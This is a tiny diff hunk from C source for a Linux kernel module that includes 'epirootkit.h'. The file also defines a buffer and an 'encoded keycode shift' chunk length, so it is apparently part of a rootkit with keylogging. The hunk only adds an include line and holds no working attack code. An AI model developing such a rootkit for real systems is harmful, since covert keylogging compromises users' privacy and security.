@@ -7,6 +7,7 @@
 #include <linux/moduleparam.h>
 
 #include "epirootkit.h"
+#include "io.h"
 
 #define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
 #define CHUNK_LEN 12             /* Encoded 'keycode shift' chunk length */
